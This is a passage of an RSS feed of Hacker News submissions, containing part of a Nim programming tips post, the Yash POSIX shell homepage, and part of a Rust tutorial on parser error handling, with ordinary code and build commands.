<p>A release build of <a href="https://github.com/johnnovak/gridmonger">Gridmonger</a>
weighs around 12 megs. Anything but small, if you ask me!<sup id="fnref:small" role="doc-noteref"><a href="#fn:small">1</a></sup> Sure, it
statically links <a href="https://github.com/johnnovak/nim-glfw">GLFW</a> and
<a href="https://github.com/johnnovak/nim-nanovg">NanoVG</a> and a bunch of other Nim
libraries, but to put things into perspective, <a href="https://reaper.fm/">REAPER</a> (a
highly-advanced and complex DAW written in C/C++) is about the same size at
~13 megs! Surely, my program is much simpler than REAPER, so whatâ€™s going on
here?</p>

<p>It turns out that gcc debug symbols are included in Nim binaries by default,
which can account for a quite substantial 2-to 5-fold size increase! Luckily,
we can remove them easily with the <code>strip</code> command which comes with gcc.</p>

<p>How about trying to optimise for a small executable with <code>--opt:size</code>?  Sure,
that would yield about 30% smaller binaries, but at the expense of some
potential runtime performance loss. So while it might not always be the best
option, but you can always it <em>and</em> strip the debug symbols for even bigger
savings.</p>

<p>Finally, if youâ€™re hell-bent on producing smallest possible binary,
compressing it with an executable packer like <a href="https://upx.github.io/">UPX</a>
could be just the ticket.</p>

<p>The below table summarises my findings with some concrete data:</p>

<figure>
  <table>
    <tbody><tr>
      <th rowspan="2">Compiler flags</th>
      <th rowspan="2">File</th>
      <th colspan="2">Binary size</th>
    </tr>
    <tr>
      <th>Bytes</th>
      <th>Ratio</th>
    </tr>

    <tr>
      <td rowspan="3"><code>-d:release<br>--gc:arc --deepCopy:on</code></td>
      <td>original</td>
      <td>12,177,797</td>
      <td>1.00</td>
    </tr>
    <tr>
      <td>stripped</td>
      <td>2,269,696</td>
      <td>0.18</td>
    </tr>
    <tr>
      <td>compressed</td>
      <td>806,912</td>
      <td>0.07</td>
    </tr>

    <tr>
      <td rowspan="3"><code>-d:release --opt:size<br>--gc:arc --deepCopy:on</code></td>
      <td>original</td>
      <td>7,959,126</td>
      <td>1.00</td>
    </tr>
    <tr>
      <td>stripped</td>
      <td>1,655,296</td>
      <td>0.21</td>
    </tr>
    <tr>
      <td>compresed</td>
      <td>623,104</td>
      <td>0.08</td>
    </tr>
  </tbody></table>

  <figcaption>Table 1 â€” Comparison of compiled executable sizes for Gridmonger
  (with and without debug symbols, and without debug symbols and compressed
  with UPX) </figcaption>
</figure>

<p>I had repeated the experiment with the following minimal Nim program:</p>



<figure>
  <table>
    <tbody><tr>
      <th rowspan="2">Compiler flags</th>
      <th rowspan="2">File</th>
      <th colspan="2">Binary size</th>
    </tr>
    <tr>
      <th>Bytes</th>
      <th>Ratio</th>
    </tr>

    <tr>
      <td rowspan="3"><code>-d:release</code></td>
      <td>original</td>
      <td>125,068</td>
      <td>1.00</td>
    </tr>
    <tr>
      <td>stripped</td>
      <td>73,728</td>
      <td>0.59</td>
    </tr>
    <tr>
      <td>compresed</td>
      <td>31,232</td>
      <td>0.25</td>
    </tr>

    <tr>
      <td rowspan="3"><code>-d:release --opt:size</code></td>
      <td>original</td>
      <td>87,812</td>
      <td>1.00</td>
    </tr>
    <tr>
      <td>stripped</td>
      <td>36,352</td>
      <td>0.41</td>
    </tr>
    <tr>
      <td>compresed</td>
      <td>18,944</td>
      <td>0.22</td>
    </tr>
  </tbody></table>

  <figcaption>Table 2 â€” Comparison of compiled executable sizes for a minimal
  Nim program (with and without debug symbols, and without debug symbols and
  compressed with UPX)</figcaption>
</figure>

<p>It is important to note that the presence of debug symbols in a binary <em>does
not</em> affect its runtime performance whatsoever. This is because debug symbols
are not even loaded into memory during normal use, only when debugging. So
really it only affects the space the executable takes up on disk.</p>

<p>In case youâ€™re wondering, youâ€™ll still get nice Nim stack traces with
a stripped binary if you compiled it with <code>-d:debug</code> or <code>--stacktrace=on
--linetrace=on</code> (more on that in the next tip).</p>

<h3 id="2--release-builds-with-exception-logging">2 &nbsp; Release builds with exception logging</h3>

<p>Creating a release build with <code>-d:release</code> gives you a speed boost, but at
the price of turning off stack traces (among other things). This can be a problem
if youâ€™re trying to implement a crash-reporting mechanism for end-users,
which involves surrounding your main method with a <code>try/except</code> block and
writing exceptions with stack traces to a log file.</p>

<p>Luckily, you donâ€™t need to ship debug builds to your users just to be able to
do that; you can still use <code>-d:release</code> to get most optimisation benefits
while turning stack traces back on with <code>--stacktrace=on --linetrace=on</code>. The
performance of the resulting binary might be a bit slower, but you know, life
is all about the right trade-offs.</p>

<h3 id="3--switching-to-arcorc">3 &nbsp; Switching to ARC/ORC</h3>

<p>Nim defaults to the <code>refc</code> garbage collector (deferred reference counting with
a mark &amp; sweep phase for cycle collection), which works very well, even for
soft-realtime requirements. But did you know that there has been a brand new
GC introduced in 1.2.x that offers reduced memory footprint and even better
performance in most cases?</p>

<p>This is ARC, the fully deterministic Automatic Reference Counting garbage
collector. Switching to ARC is as easy as supplying the <code>--gc:arc</code> option to
the compiler. Itâ€™s a drop-in replacement for most programs. Depending on your
program, you might want to use it with the <code>--deepcopy:on
--hint[Performance]:off</code> options.</p>

<p>ARC has many other benefits, including hard realtime support, shared heaps
between threads, and simplifying the C FFI.  Mind you, ARC cannot handle
cyclic data structures. But it has a big brother called ORC, which adds support
for that.</p>

<p>You can learn more about ARC and ORC in this <a href="https://nim-lang.org/blog/2020/10/15/introduction-to-arc-orc-in-nim.html">excellent blog
post</a>
on the Nim website.</p>

<h3 id="4--executable-icons-on-windows-mingw">4 &nbsp; Executable icons on Windows (MinGW)</h3>

<p>Setting the icon for Windows executables is probably easier with Visual
Studio, but anyhow, here are the instructions for gcc/MinGW that Iâ€™m using.</p>

<ol>
  <li>
    <p>First, youâ€™ll need to generate an <code>.ico</code> file that contains your icon image
in multiple resolutions. Thereâ€™s lots of online tools for that, and thereâ€™s
also ImageMagickâ€”this is outside the scope of this article.</p>
  </li>
  <li>
    <p>Once you have your image, youâ€™ll need to create a resource definition <code>.rc</code>
file that references your icon file. I used <code>appicon</code> here for the ID, but
you can use any other string, it doesnâ€™t matter:</p>

    <div><div><pre><code> appicon ICON "gridmonger.ico"
</code></pre></div>    </div>
  </li>
  <li>
    <p>The next step is to create the resource object file from the <code>.rc</code> file
(<code>windres</code> is included in MinGW):</p>

    <div><div><pre><code> windres gridmonger.rc -O coff -o gridmonger.res
</code></pre></div>    </div>
  </li>
  <li>
    <p>Finally, we need to instruct the compiler to link the resource file
into our program:</p>

    <div><div><pre><code> <span>when</span> <span>defined</span><span>(</span><span>windows</span><span>):</span>
   <span>{.</span><span>link</span><span>:</span> <span>"icons/gridmonger.res"</span><span>.}</span>
</code></pre></div>    </div>
  </li>
</ol>

<h3 id="5--debug-echo-in-windows-gui-programs-mingw">5 &nbsp; Debug echo in Windows GUI programs (MinGW)</h3>

<p>This will be a rather short one but it took me a while to figure it out. It
turns out that when you link against the Windows libraries by passing
<code>-mwindows</code> to the linker (<code>-L:-mwindows</code>), you wonâ€™t be able to print stuff
the console with <code>echo</code> anymore.</p>

<p>â€œBut this is a useless tip, of course you need to link against the Windows
libs in a GUI program!â€, I hear you say. Well, not necessarily. In GLFW apps,
for example, you can get away with not linking against the Windows libs in
many cases. For instance, in Gridmonger I only need <code>-mwindows</code> so I can open
the standard open and save system dialogs. In my debug builds, I donâ€™t link
against the Windows libs and I conditionally turn the calls to the dialog
functions to no-ops, and then I can do my debug printing to the console.</p>



<h3 id="6--using-keyword">6 &nbsp; â€˜usingâ€™ keyword</h3>

<p>The
<a href="https://nim-lang.org/docs/manual.html#statements-and-expressions-using-statement">using</a>
keyword is a very useful, but often forgotten language feature. It helps to
cut down on redundancy when creating method call style APIs, or when passing
context objects around.</p>

<div><div><pre><code><span># Without `using`</span>
<span>proc </span><span>getFloor</span><span>*</span><span>(</span><span>l</span><span>:</span> <span>Level</span><span>,</span> <span>row</span><span>,</span> <span>col</span><span>:</span> <span>Natural</span><span>,</span> <span>a</span><span>:</span> <span>var</span> <span>AppContext</span><span>):</span> <span>Floor</span> <span>=</span> <span>...</span>
<span>proc </span><span>setFloor</span><span>*</span><span>(</span><span>l</span><span>:</span> <span>Level</span><span>,</span> <span>row</span><span>,</span> <span>col</span><span>:</span> <span>Natural</span><span>,</span> <span>f</span><span>:</span> <span>Floor</span><span>,</span> <span>a</span><span>:</span> <span>var</span> <span>AppContext</span><span>)</span> <span>=</span> <span>...</span>

<span># With `using`</span>
<span>using</span> <span>l</span><span>:</span> <span>Level</span>
<span>using</span> <span>a</span><span>:</span> <span>var</span> <span>AppContext</span>

<span>proc </span><span>getFloor</span><span>*</span><span>(</span><span>l</span><span>;</span> <span>row</span><span>,</span> <span>col</span><span>:</span> <span>Natural</span><span>;</span> <span>a</span><span>):</span> <span>Floor</span> <span>=</span> <span>...</span>
<span>proc </span><span>setFloor</span><span>*</span><span>(</span><span>l</span><span>;</span> <span>row</span><span>,</span> <span>col</span><span>:</span> <span>Natural</span><span>,</span> <span>f</span><span>:</span> <span>Floor</span><span>;</span> <span>a</span><span>)</span> <span>=</span> <span>...</span>
</code></pre></div></div>

<h3 id="7--opening-urls-in-the-default-browser">7 &nbsp; Opening URLs in the default browser</h3>

<p>Did you know that the standard library has
a <a href="https://nim-lang.org/docs/browsers.html">browsers</a> module for the sole
purpose of opening URLs in the OS default browser in a cross-platform way?
In fact, Iâ€™ve been using Nim for 4 years and Iâ€™ve learned about this just
recently!</p>

<p>This is very handy if you want to navigate the user to a programâ€™s website
from a desktop app, or to open local HTML documentation.</p>

<h3 id="8--cross-platform-home-and-config-directories">8 &nbsp; Cross-platform home and config directories</h3>

<p>Similarly, <a href="https://nim-lang.org/docs/os.html#getHomeDir">getHomeDir()</a> and
<a href="https://nim-lang.org/docs/os.html#getConfigDir">getConfigDir()</a> from the
<a href="https://nim-lang.org/docs/os.html">os</a> module are super handy if you need to
handle configuration files or program data in a cross-platform way.</p>

<h3 id="9--debug-dumping-expressions">9 &nbsp; Debug dumping expressions</h3>

<p>However sophisticated modern development tools might be, just echoing stuff to
the console is still one of the easiest and quickest ways to debug a program.
But writing things like <code>echo "foo: ", foo</code> for the hundredth time gets old
really fast. The <a href="https://nim-lang.org/docs/sugar.html#dump.m%2Cuntyped">dump</a>
macro in the standard <a href="https://nim-lang.org/docs/sugar.html">sugar</a> module
helps with exactly that.</p>

<p>Make sure to check out the other useful additions the module introduces!</p>

<div><div><pre><code><span>import</span> <span>sugar</span>

<span>var</span>
  <span>a</span> <span>=</span> <span>42</span>
  <span>s</span> <span>=</span> <span>"frobnicate"</span>
  <span>x</span> <span>=</span> <span>7</span>

<span>dump</span><span>(</span><span>a</span><span>)</span>
<span>dump</span><span>(</span><span>s</span><span>)</span>
<span>dump</span><span>(</span><span>a</span> <span>+</span> <span>x</span><span>)</span>

<span># prints:</span>
<span># a = 42</span>
<span># s = frobnicate</span>
<span># a + x = 49</span>
</code></pre></div></div>

<h3 id="10--measuring-elapsed-time">10 &nbsp; Measuring elapsed time</h3>

<p>Although you can use the regular <a href="https://nim-lang.org/docs/times.html">times</a>
module to measure elapsed time, to do it properly you really need a monotonic
timer. Such a thing has been added to the standard library recently in the
form of <a href="https://nim-lang.org/docs/monotimes.html">std/monotimes</a>.</p>

<div><div><pre><code><span>import</span> <span>os</span>
<span>import</span> <span>std</span><span>/</span><span>monotimes</span>
<span>import</span> <span>times</span>

<span>proc </span><span>durationToFloatMillis</span><span>*</span><span>(</span><span>d</span><span>:</span> <span>Duration</span><span>):</span> <span>float64</span> <span>=</span>
  <span>inNanoseconds</span><span>(</span><span>d</span><span>).</span><span>float64</span> <span>*</span> <span>1e-6</span>

<span>let</span> <span>t0</span> <span>=</span> <span>getMonoTime</span><span>()</span>
<span>sleep</span><span>(</span><span>10</span><span>)</span> <span># do something for a while</span>
<span>let</span> <span>d</span> <span>=</span> <span>getMonoTime</span><span>()</span> <span>-</span> <span>t0</span>

<span>echo</span> <span>durationToFloatMillis</span><span>(</span><span>d</span><span>)</span>
</code></pre></div></div>

<h3 id="11--dealing-with-openarrays">11 &nbsp; Dealing with openarrays</h3>

<p><a href="https://nim-lang.org/docs/manual.html#types-open-arrays">Openarrays</a>
are a handy Nim feature that allow you to â€¦</p></article></div></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://blog.johnnovak.net/2020/12/21/nim-apocrypha-vol1/">https://blog.johnnovak.net/2020/12/21/nim-apocrypha-vol1/</a></em></p>]]>
            </description>
            <link>https://blog.johnnovak.net/2020/12/21/nim-apocrypha-vol1/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25495098</guid>
            <pubDate>Mon, 21 Dec 2020 14:15:46 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Yash, yet another shell, a Posix-compliant command line shell written in C99]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25495020">thread link</a>) | @codesections
<br/>
December 21, 2020 | https://yash.osdn.jp/index.html.en | <a href="https://web.archive.org/web/*/https://yash.osdn.jp/index.html.en">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page">
<p>This web page is also available in <a href="https://yash.osdn.jp/index.html.ja" lang="ja">æ—¥æœ¬èª</a>.

</p>

<p id="summary">Yash, yet another shell,
is a POSIX-compliant command line shell written in C99 (ISO/IEC 9899:1999).
Yash is intended to be the most POSIX-compliant shell in the world
while supporting features for daily interactive and scripting use.
Notable features are:
</p><ul>
<li>Global aliases
</li><li>Arrays
</li><li>Socket redirection, pipeline redirection, and process redirection
</li><li>Brace expansion and extended globbing
</li><li>Fractional numbers in arithmetic expansion
</li><li>Prompt command and command-not-found handler
</li><li>Command line completion with predefined completion scripts for more than 100 commands
</li><li>Command line prediction based on command history
</li></ul>
<p>Yash can be modified/redistributed under the terms of the <a href="http://www.gnu.org/licenses/gpl.html">GNU General Public License</a>
(Version 2) but the use of this program is
<strong>without any warranty</strong>.
</p><p><a href="https://osdn.net/"></a>:
Yash is an OSDN-hosted project. See also the
<a href="https://osdn.net/projects/yash/">project summary page</a>.

</p><h2 id="progress">Current Development Status</h2>
<p>Yash now fully supports POSIX.1-2008 (IEEE Std 1003.1, 2016 Edition)
except for the limitations listed in <a href="https://github.com/magicant/yash/blob/trunk/README">README</a>.
</p><p>Yash is stable. A maintenance update is released every three months or so.
For the change history, see <a href="https://github.com/magicant/yash/blob/trunk/NEWS">NEWS</a>.
</p><p>The source code is versioned in the <a href="https://osdn.net/projects/yash/scm/svn/">Subversion repository</a> and mirrored
on <a href="https://github.com/magicant/yash">GitHub</a>.

</p><h2 id="requirements">Requirements</h2>
<p>Yash is supposed to build and run on any POSIX.1-2001 environment
with the Software Development Utilities and the C-Language Development Utilities
options.
Currently, yash is mainly tested on Fedora, macOS, and Cygwin.

</p><h2 id="downloads">Installation</h2>
<p>The source tarball can be downloaded from the
<a href="https://osdn.net/projects/yash/releases/">release page</a>
(or the <a href="https://yash.osdn.jp/releases">release list</a>).
</p><p>On <a href="https://getfedora.org/">Fedora</a>, the yash package can be installed by <kbd>sudo dnf install yash</kbd>. On <a href="https://www.debian.org/">Debian</a> and <a href="https://www.ubuntu.com/">Ubuntu</a>, the yash package can be installed by <kbd>sudo apt-get install yash</kbd>. For macOS, <a href="https://www.macports.org/">MacPorts</a> and <a href="http://brew.sh/">Homebrew</a> provide yash installation.
</p><p>After installation, enter <kbd>yash</kbd> in the terminal to start yash.
The <a href="https://yash.osdn.jp/doc/">manual</a> can be viewed by <kbd>man yash</kbd>.

</p><h2 id="configuration">Basic Configuration</h2>

<h3>Initialization scripts</h3>
<p>When yash is started as a login shell, it reads ~/.yash_profile.
This file is a shell script in which you define environment variables using the export command.
</p><p>When yash is started for an interactive use, it reads ~/.yashrc (after reading ~/.yash_profile if it is a login shell also).
In this file, you make other configurations such as aliases, prompt strings, key bindings for command line editing, and command-not-found handler.
Use the <a href="https://github.com/magicant/yash/blob/trunk/share/initialization/sample">sample yashrc</a> as a template for your ~/.yashrc.

</p><h3>Making yash your login shell</h3>
<p>In many Unix-like OSes, a shell must be listed in /etc/shells to be set as a login shell. Edit this file and ensure that the path to yash is written in the file.
</p><p>Then, run the <kbd>chsh</kbd> command in the terminal and follow instructions from the command.
Depending on your system, you may have to use another command to change the login shell.
See documentation on your system.

</p><address id="about_this_document">
Â© 2009-2017 <a href="mailto:magicant@users.osdn.me">magicant</a> / Last modified: 2017-01-18
</address>



</div>]]>
            </description>
            <link>https://yash.osdn.jp/index.html.en</link>
            <guid isPermaLink="false">hacker-news-small-sites-25495020</guid>
            <pubDate>Mon, 21 Dec 2020 14:05:46 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Make a Language in Rust: Errors]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25494909">thread link</a>) | @azhenley
<br/>
December 21, 2020 | https://arzg.github.io/lang/18/ | <a href="https://web.archive.org/web/*/https://arzg.github.io/lang/18/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p>So far, our parser has only concerned itself with input that is correct. In a world of IDEs and language servers, however, the input to our parser will be wrong more often than not. Therefore, it is important that our parser can:</p><ul><li>recover gracefully from errors</li><li>infer as detailed a syntax tree from the input as possible</li><li>report errors in a user-friendly manner</li></ul><p>Unfortunately for us, the only thing our parser currently supports is arithmetic expressions, which donâ€™t make error recovery techniques easy to demonstrate. Letâ€™s first implement a parser for variable definitions.</p><p>Since variable definitions arenâ€™t expressions, we shouldnâ€™t put them in the <code>expr</code> module. Letâ€™s create a new <code>stmt</code> module for statements:</p><div><pre><code data-lang="rust"><span>// grammar.rs
</span><span></span><span>
</span><span></span><span>mod</span> <span>expr</span><span>;</span><span>
</span><span></span><span>mod</span> <span>stmt</span><span>;</span><span>
</span></code></pre></div><div><pre><code data-lang="rust"><span>// crates/parser/src/grammar/stmt.rs
</span><span></span><span>
</span><span></span><span>use</span><span> </span><span>super</span>::<span>*</span><span>;</span><span>
</span><span>
</span><span></span><span>pub</span><span>(</span><span>super</span><span>)</span><span> </span><span>fn</span> <span>stmt</span><span>(</span><span>p</span>: <span>&amp;</span><span>mut</span><span> </span><span>Parser</span><span>)</span><span> </span>-&gt; <span>Option</span><span>&lt;</span><span>CompletedMarker</span><span>&gt;</span><span> </span><span>{</span><span>
</span><span>    </span><span>todo</span><span>!</span><span>()</span><span>
</span><span></span><span>}</span><span>
</span></code></pre></div><p>Weâ€™ll use the same syntax for variable definitions as we used before the rewrite:</p><pre><code>let name = expr
</code></pre><p>A test:</p><div><pre><code data-lang="rust"><span>#[cfg(test)]</span><span>
</span><span></span><span>mod</span> <span>tests</span><span> </span><span>{</span><span>
</span><span>    </span><span>use</span><span> </span><span>crate</span>::<span>check</span><span>;</span><span>
</span><span>    </span><span>use</span><span> </span><span>expect_test</span>::<span>expect</span><span>;</span><span>
</span><span>
</span><span>    </span><span>#[test]</span><span>
</span><span>    </span><span>fn</span> <span>parse_variable_definition</span><span>()</span><span> </span><span>{</span><span>
</span><span>        </span><span>check</span><span>(</span><span>
</span><span>            </span><span>"let foo = bar"</span><span>,</span><span>
</span><span>            </span><span>expect</span><span>!</span><span>[[</span><span>r#"
</span><span>Root@0..13
</span><span>  VariableDef@0..13
</span><span>    LetKw@0..3 "let"
</span><span>    Whitespace@3..4 " "
</span><span>    Ident@4..7 "foo"
</span><span>    Whitespace@7..8 " "
</span><span>    Equals@8..9 "="
</span><span>    Whitespace@9..10 " "
</span><span>    VariableRef@10..13
</span><span>      Ident@10..13 "bar""#</span><span>]],</span><span>
</span><span>        </span><span>);</span><span>
</span><span>    </span><span>}</span><span>
</span><span></span><span>}</span><span>
</span></code></pre></div><p>We can now implement parsing of variable definitions:</p><div><pre><code data-lang="rust"><span>pub</span><span>(</span><span>super</span><span>)</span><span> </span><span>fn</span> <span>stmt</span><span>(</span><span>p</span>: <span>&amp;</span><span>mut</span><span> </span><span>Parser</span><span>)</span><span> </span>-&gt; <span>Option</span><span>&lt;</span><span>CompletedMarker</span><span>&gt;</span><span> </span><span>{</span><span>
</span><span>    </span><span>match</span><span> </span><span>p</span><span>.</span><span>peek</span><span>()</span><span> </span><span>{</span><span>
</span><span>        </span><span>Some</span><span>(</span><span>SyntaxKind</span>::<span>LetKw</span><span>)</span><span> </span><span>=&gt;</span><span> </span><span>variable_def</span><span>(</span><span>p</span><span>),</span><span>
</span><span>        </span><span>_</span><span> </span><span>=&gt;</span><span> </span><span>None</span><span>,</span><span>
</span><span>    </span><span>}</span><span>
</span><span></span><span>}</span><span>
</span><span>
</span><span></span><span>fn</span> <span>variable_def</span><span>(</span><span>p</span>: <span>&amp;</span><span>mut</span><span> </span><span>Parser</span><span>)</span><span> </span>-&gt; <span>Option</span><span>&lt;</span><span>CompletedMarker</span><span>&gt;</span><span> </span><span>{</span><span>
</span><span>    </span><span>assert</span><span>!</span><span>(</span><span>p</span><span>.</span><span>at</span><span>(</span><span>SyntaxKind</span>::<span>LetKw</span><span>));</span><span>
</span><span>    </span><span>let</span><span> </span><span>m</span><span> </span><span>=</span><span> </span><span>p</span><span>.</span><span>start</span><span>();</span><span>
</span><span>    </span><span>p</span><span>.</span><span>bump</span><span>();</span><span>
</span><span>
</span><span>    </span><span>assert</span><span>!</span><span>(</span><span>p</span><span>.</span><span>at</span><span>(</span><span>SyntaxKind</span>::<span>Ident</span><span>));</span><span>
</span><span>    </span><span>p</span><span>.</span><span>bump</span><span>();</span><span>
</span><span>
</span><span>    </span><span>assert</span><span>!</span><span>(</span><span>p</span><span>.</span><span>at</span><span>(</span><span>SyntaxKind</span>::<span>Equals</span><span>));</span><span>
</span><span>    </span><span>p</span><span>.</span><span>bump</span><span>();</span><span>
</span><span>
</span><span>    </span><span>expr</span>::<span>expr</span><span>(</span><span>p</span><span>)</span><span>?</span><span>;</span><span>
</span><span>
</span><span>    </span><span>Some</span><span>(</span><span>m</span><span>.</span><span>complete</span><span>(</span><span>p</span><span>,</span><span> </span><span>SyntaxKind</span>::<span>VariableDef</span><span>))</span><span>
</span><span></span><span>}</span><span>
</span></code></pre></div><p>Instead of handling errors, we repeatedly <code>assert</code> the token weâ€™re at; since we know at that point the token weâ€™re at, we can just <code>bump</code> past it.</p><p>Letâ€™s quickly define <code>SyntaxKind::VariableDef</code>:</p><div><pre><code data-lang="rust"><span>// crates/syntax/src/lib.rs
</span><span></span><span>
</span><span></span><span>#[derive(Debug, Copy, Clone, PartialEq, FromPrimitive, ToPrimitive)]</span><span>
</span><span></span><span>pub</span><span> </span><span>enum</span> <span>SyntaxKind</span><span> </span><span>{</span><span>
</span><span>    </span><span>// snip
</span><span></span><span>    </span><span>Root</span><span>,</span><span>
</span><span>    </span><span>InfixExpr</span><span>,</span><span>
</span><span>    </span><span>Literal</span><span>,</span><span>
</span><span>    </span><span>ParenExpr</span><span>,</span><span>
</span><span>    </span><span>PrefixExpr</span><span>,</span><span>
</span><span>    </span><span>VariableDef</span><span>,</span><span>
</span><span>    </span><span>VariableRef</span><span>,</span><span>
</span><span></span><span>}</span><span>
</span></code></pre></div><p>Our parser compiles, but we get a failing test because <code>root</code> doesnâ€™t use <code>stmt</code>. The solution is to have <code>stmt</code> fall back to calling <code>expr</code> if it isnâ€™t sure what itâ€™s looking at:</p><div><pre><code data-lang="rust"><span>// crates/parser/src/grammar/stmt.rs
</span><span></span><span>
</span><span></span><span>pub</span><span>(</span><span>super</span><span>)</span><span> </span><span>fn</span> <span>stmt</span><span>(</span><span>p</span>: <span>&amp;</span><span>mut</span><span> </span><span>Parser</span><span>)</span><span> </span>-&gt; <span>Option</span><span>&lt;</span><span>CompletedMarker</span><span>&gt;</span><span> </span><span>{</span><span>
</span><span>    </span><span>match</span><span> </span><span>p</span><span>.</span><span>peek</span><span>()</span><span> </span><span>{</span><span>
</span><span>        </span><span>Some</span><span>(</span><span>SyntaxKind</span>::<span>LetKw</span><span>)</span><span> </span><span>=&gt;</span><span> </span><span>variable_def</span><span>(</span><span>p</span><span>),</span><span>
</span><span>        </span><span>_</span><span> </span><span>=&gt;</span><span> </span><span>expr</span>::<span>expr</span><span>(</span><span>p</span><span>),</span><span>
</span><span>    </span><span>}</span><span>
</span><span></span><span>}</span><span>
</span></code></pre></div><p>We can now call <code>stmt</code> from <code>root</code>:</p><div><pre><code data-lang="rust"><span>// grammar.rs
</span><span></span><span>
</span><span></span><span>pub</span><span>(</span><span>crate</span><span>)</span><span> </span><span>fn</span> <span>root</span><span>(</span><span>p</span>: <span>&amp;</span><span>mut</span><span> </span><span>Parser</span><span>)</span><span> </span>-&gt; <span>CompletedMarker</span><span> </span><span>{</span><span>
</span><span>    </span><span>let</span><span> </span><span>m</span><span> </span><span>=</span><span> </span><span>p</span><span>.</span><span>start</span><span>();</span><span>
</span><span>    </span><span>stmt</span>::<span>stmt</span><span>(</span><span>p</span><span>);</span><span>
</span><span>
</span><span>    </span><span>m</span><span>.</span><span>complete</span><span>(</span><span>p</span><span>,</span><span> </span><span>SyntaxKind</span>::<span>Root</span><span>)</span><span>
</span><span></span><span>}</span><span>
</span></code></pre></div><pre><code data-lang="-">$ cargo t -q --lib

running 18 tests
..................
test result: ok. 18 passed; 0 failed; 0 ignored; 0 measured; 0 filtered out


running 18 tests
...............F..
failures:

---- grammar::stmt::tests::parse_variable_definition stdout ----
thread 'grammar::stmt::tests::parse_variable_definition' panicked at 'Markers need to be completed', /Users/aramis/.cargo/registry/src/github.com-1ecc6299db9ec823/drop_bomb-0.1.5/src/lib.rs:113:13
note: run with `RUST_BACKTRACE=1` environment variable to display a backtrace


failures:
    grammar::stmt::tests::parse_variable_definition

test result: FAILED. 17 passed; 1 failed; 0 ignored; 0 measured; 0 filtered out
</code></pre><p>What seems to have happened is that <code>expr</code> has returned <code>None</code>, causing <code>variable_def</code> to return early, which in turn means the marker isnâ€™t completed. Since we donâ€™t care about error handling yet, we can add an <code>unwrap</code>:</p><div><pre><code data-lang="rust"><span>// stmt.rs
</span><span></span><span>
</span><span></span><span>pub</span><span>(</span><span>super</span><span>)</span><span> </span><span>fn</span> <span>stmt</span><span>(</span><span>p</span>: <span>&amp;</span><span>mut</span><span> </span><span>Parser</span><span>)</span><span> </span>-&gt; <span>Option</span><span>&lt;</span><span>CompletedMarker</span><span>&gt;</span><span> </span><span>{</span><span>
</span><span>    </span><span>match</span><span> </span><span>p</span><span>.</span><span>peek</span><span>()</span><span> </span><span>{</span><span>
</span><span>        </span><span>Some</span><span>(</span><span>SyntaxKind</span>::<span>LetKw</span><span>)</span><span> </span><span>=&gt;</span><span> </span><span>Some</span><span>(</span><span>variable_def</span><span>(</span><span>p</span><span>)),</span><span>
</span><span>        </span><span>_</span><span> </span><span>=&gt;</span><span> </span><span>expr</span>::<span>expr</span><span>(</span><span>p</span><span>),</span><span>
</span><span>    </span><span>}</span><span>
</span><span></span><span>}</span><span>
</span><span>
</span><span></span><span>fn</span> <span>variable_def</span><span>(</span><span>p</span>: <span>&amp;</span><span>mut</span><span> </span><span>Parser</span><span>)</span><span> </span>-&gt; <span>CompletedMarker</span><span> </span><span>{</span><span>
</span><span>    </span><span>assert</span><span>!</span><span>(</span><span>p</span><span>.</span><span>at</span><span>(</span><span>SyntaxKind</span>::<span>LetKw</span><span>));</span><span>
</span><span>    </span><span>let</span><span> </span><span>m</span><span> </span><span>=</span><span> </span><span>p</span><span>.</span><span>start</span><span>();</span><span>
</span><span>    </span><span>p</span><span>.</span><span>bump</span><span>();</span><span>
</span><span>
</span><span>    </span><span>assert</span><span>!</span><span>(</span><span>p</span><span>.</span><span>at</span><span>(</span><span>SyntaxKind</span>::<span>Ident</span><span>));</span><span>
</span><span>    </span><span>p</span><span>.</span><span>bump</span><span>();</span><span>
</span><span>
</span><span>    </span><span>assert</span><span>!</span><span>(</span><span>p</span><span>.</span><span>at</span><span>(</span><span>SyntaxKind</span>::<span>Equals</span><span>));</span><span>
</span><span>    </span><span>p</span><span>.</span><span>bump</span><span>();</span><span>
</span><span>
</span><span>    </span><span>expr</span>::<span>expr</span><span>(</span><span>p</span><span>).</span><span>unwrap</span><span>();</span><span>
</span><span>
</span><span>    </span><span>m</span><span>.</span><span>complete</span><span>(</span><span>p</span><span>,</span><span> </span><span>SyntaxKind</span>::<span>VariableDef</span><span>)</span><span>
</span><span></span><span>}</span><span>
</span></code></pre></div><pre><code data-lang="-">$ cargo t -q --lib

running 18 tests
..................
test result: ok. 18 passed; 0 failed; 0 ignored; 0 measured; 0 filtered out


running 18 tests
..............F...
failures:

---- grammar::stmt::tests::parse_variable_definition stdout ----
thread 'grammar::stmt::tests::parse_variable_definition' panicked at 'called `Option::unwrap()` on a `None` value', crates/parser/src/grammar/stmt.rs:21:19
note: run with `RUST_BACKTRACE=1` environment variable to display a backtrace


failures:
    grammar::stmt::tests::parse_variable_definition

test result: FAILED. 17 passed; 1 failed; 0 ignored; 0 measured; 0 filtered out
</code></pre><p>Huh, thatâ€™s weird; why is <code>expr</code> returning <code>None</code>? The only places where it can do so are <code>let lhs = lhs()?;</code> and if it doesnâ€™t see an operator. Oh, <em>wait.</em></p><p>We should be returning <code>lhs</code> at that point instead:</p><div><pre><code data-lang="rust"><span>fn</span> <span>expr_binding_power</span><span>(</span><span>p</span>: <span>&amp;</span><span>mut</span><span> </span><span>Parser</span><span>,</span><span> </span><span>minimum_binding_power</span>: <span>u8</span><span>)</span><span> </span>-&gt; <span>Option</span><span>&lt;</span><span>CompletedMarker</span><span>&gt;</span><span> </span><span>{</span><span>
</span><span>    </span><span>let</span><span> </span><span>mut</span><span> </span><span>lhs</span><span> </span><span>=</span><span> </span><span>lhs</span><span>(</span><span>p</span><span>)</span><span>?</span><span>;</span><span> </span><span>// weâ€™ll handle errors later.
</span><span></span><span>
</span><span>    </span><span>loop</span><span> </span><span>{</span><span>
